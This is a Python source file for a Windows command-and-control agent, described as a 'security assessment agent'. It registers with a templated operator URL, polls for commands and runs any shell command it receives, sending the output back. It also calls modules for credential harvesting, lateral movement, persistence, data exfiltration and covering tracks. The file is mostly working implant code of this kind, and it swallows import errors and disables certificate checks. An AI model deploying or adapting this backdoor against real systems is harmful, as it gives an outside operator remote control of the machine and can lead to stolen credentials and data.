#!/usr/bin/env python3
"""
C2 Agent - Windows
Security Assessment Agent for Windows Systems
"""

import requests
import time
import socket
import platform
import json
import sys
import os

# Configuration
OPERATOR_URL = "{{OPERATOR_URL}}"
AGENT_ID = "{{AGENT_ID}}"
CHECKIN_INTERVAL = 30  # seconds

# Import security modules
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'modules'))

try:
    from modules import privilege_escalation
    from modules import persistence
    from modules import credential_harvesting
    from modules import reconnaissance
    from modules import lateral_movement
    from modules import data_access
    from modules import data_exfiltration
    from modules import c2_comms
    from modules import covering_tracks
except ImportError as e:
    # Silent fail for compiled version
    pass

class C2Agent:
    def __init__(self):
        self.agent_id = AGENT_ID
        self.operator_url = OPERATOR_URL
        self.hostname = socket.gethostname()
        self.platform = f"Windows {platform.release()}"

    def register(self):
        """Register with operator"""
        try:
            response = requests.post(
                f"{self.operator_url}/api/register",
                json={
                    "agent_id": self.agent_id,
                    "hostname": self.hostname,
                    "platform": self.platform
                },
                timeout=10,
                verify=False  # For testing, remove in production
            )
            return response.status_code == 200
        except Exception as e:
            return False

    def checkin(self):
        """Check in with operator and get commands"""
        try:
            response = requests.post(
                f"{self.operator_url}/api/checkin",
                json={"agent_id": self.agent_id},
                timeout=10,
                verify=False
            )
            if response.status_code == 200:
                data = response.json()
                return data.get('command')
        except Exception:
            pass
        return None

    def send_results(self, module, results):
        """Send assessment results to operator"""
        try:
            response = requests.post(
                f"{self.operator_url}/api/results",
                json={
                    "agent_id": self.agent_id,
                    "module": module,
                    "results": results
                },
                timeout=10,
                verify=False
            )
            return response.status_code == 200
        except Exception:
            return False

    def execute_module(self, module_name):
        """Execute a security assessment module"""
        try:
            if module_name == "privilege_escalation":
                results = privilege_escalation.check()
            elif module_name == "persistence":
                results = persistence.check()
            elif module_name == "credential_harvesting":
                results = credential_harvesting.check()
            elif module_name == "reconnaissance":
                results = reconnaissance.check()
            elif module_name == "lateral_movement":
                results = lateral_movement.check()
            elif module_name == "data_access":
                results = data_access.check()
            elif module_name == "data_exfiltration":
                results = data_exfiltration.check()
            elif module_name == "c2_comms":
                results = c2_comms.check()
            elif module_name == "covering_tracks":
                results = covering_tracks.check()
            else:
                results = {"error": f"Unknown module: {module_name}"}

            self.send_results(module_name, results)
        except Exception as e:
            error_results = {"error": str(e)}
            self.send_results(module_name, error_results)

    def run(self):
        """Main agent loop"""
        # Register with operator
        if not self.register():
            time.sleep(60)
            return

        # Main loop
        while True:
            try:
                command = self.checkin()

                if command:
                    cmd_type = command.get('type')

                    if cmd_type == 'module':
                        module_name = command.get('module')
                        self.execute_module(module_name)
                    elif cmd_type == 'shell':
                        # Execute shell command (basic implementation)
                        import subprocess
                        cmd = command.get('cmd')
                        try:
                            output = subprocess.check_output(
                                cmd,
                                shell=True,
                                stderr=subprocess.STDOUT,
                                timeout=30
                            ).decode('utf-8', errors='ignore')
                            self.send_results('shell', {'output': output})
                        except Exception as e:
                            self.send_results('shell', {'error': str(e)})

                time.sleep(CHECKIN_INTERVAL)

            except KeyboardInterrupt:
                break
            except Exception:
                time.sleep(CHECKIN_INTERVAL)

if __name__ == '__main__':
    agent = C2Agent()
    agent.run()
